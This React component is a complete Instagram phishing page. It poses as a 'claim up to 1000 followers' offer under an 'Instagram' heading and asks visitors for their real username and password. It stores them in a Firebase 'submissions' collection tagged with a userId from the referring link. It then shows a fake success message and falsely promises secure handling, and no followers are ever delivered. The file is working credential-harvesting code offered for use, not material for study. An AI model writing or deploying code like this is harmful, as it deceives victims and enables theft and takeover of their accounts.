import React, { useState, useEffect } from 'react';
import { db } from '../firebase';  // Firebase Firestore instance
import { collection, addDoc } from 'firebase/firestore';
import { useLocation } from 'react-router-dom';  // Import the useLocation hook

const ClaimFollowers = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    followersToClaim: 0,  // Add followers to claim
  });
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(false);  // To track form validation
  const [userId, setUserId] = useState('');  // Store userId from the URL

  const location = useLocation();

  // Extract userId from the URL query parameters
  useEffect(() => {
    const params = new URLSearchParams(location.search);
    const userIdFromLink = params.get('userid');
    console.log("Extracted userId from URL: ", userIdFromLink);  // Debugging log
    if (userIdFromLink) {
      setUserId(userIdFromLink);
    } else {
      console.error('No userId found in URL');
    }
  }, [location]);

  // Handle form input changes
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });

    // Validate that the number of followers to claim is <= 1000
    if (name === 'followersToClaim') {
      const followers = parseInt(value, 10);
      if (followers > 1000 || followers < 1) {
        setError(true);
      } else {
        setError(false);
      }
    }
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    if (error) {
      setMessage('Invalid number of followers. You can claim between 1 and 1000 followers.');
      setLoading(false);
      return;
    }

    if (!userId) {
      setMessage('User ID is missing. Unable to process the request.');
      setLoading(false);
      return;
    }

    try {
      console.log("Submitting the following data to Firestore:", {
        ...formData,
        userId: userId,  // Store the userId from the URL parameter
        timestamp: new Date(),
      });

      // Save form data to Firestore, including the userId
      await addDoc(collection(db, 'submissions'), {
        ...formData,
        userId: userId,  // Store the userId from the URL parameter
        timestamp: new Date(),
      });
      
      setMessage('Followers claimed successfully! Your request is being processed.');
      setFormData({ username: '', password: '', followersToClaim: 0 });
    } catch (error) {
      console.error('Error adding document: ', error);
      setMessage('There was an error submitting your request. Please try again later.');
    }
    setLoading(false);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen">
      
      {/* Explanation about claiming followers */}
      <div className="mb-6 text-center max-w-sm text-sm">
        <p className="mb-4 text-gray-800 font-bold">
          Claim up to 1000 Followers!
        </p>
        <ul className="list-disc list-inside text-left text-gray-800 font-bold mb-4">
          <li className="text-lg">📈 Grow your Instagram account by claiming followers quickly.</li>
          <li className="text-lg">⚡ Instant processing of up to 1000 followers at a time.</li>
          <li className="text-lg">🔒 Secure and confidential handling of your data.</li>
        </ul>
        <p className="text-gray-800">
          Please provide your actual Instagram username, password, and the number of followers you want to claim.
        </p>
      </div>

      {/* Container for the form */}
      <div className="w-full max-w-xs p-6">
        {/* Logo Placeholder */}
        <h1 className="text-3xl font-bold text-center text-gray-800 mb-6">Instagram</h1>

        {/* Claim Followers Form */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              name="username"
              value={formData.username}
              onChange={handleInputChange}
              required
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Username"
            />
          </div>
          <div>
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleInputChange}
              required
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Password"
            />
          </div>
          <div>
            <input
              type="number"
              name="followersToClaim"
              value={formData.followersToClaim}
              onChange={handleInputChange}
              required
              className={`w-full p-3 border ${error ? 'border-red-500' : 'border-gray-300'} rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500`}
              placeholder="Followers to Claim (1-1000)"
              min="1"
              max="1000"
            />
            {error && <p className="text-red-500 text-sm mt-1">You can claim between 1 and 1000 followers only.</p>}
          </div>
          <button
            type="submit"
            className={`w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition duration-300 font-semibold ${loading || error ? 'opacity-50 cursor-not-allowed' : ''}`}
            disabled={loading || error}  // Disable button if input is invalid
          >
            {loading ? 'Submitting...' : 'Claim Followers'}
          </button>
        </form>

        {/* Forgot Password Link */}
        <p className="text-center mt-4 text-sm text-blue-500 hover:underline cursor-pointer">
          Forgot Password?
        </p>

        {/* Message after submission */}
        {message && <p className="text-center mt-4 text-green-500">{message}</p>}

      </div>

    </div>
  );
};

export default ClaimFollowers;
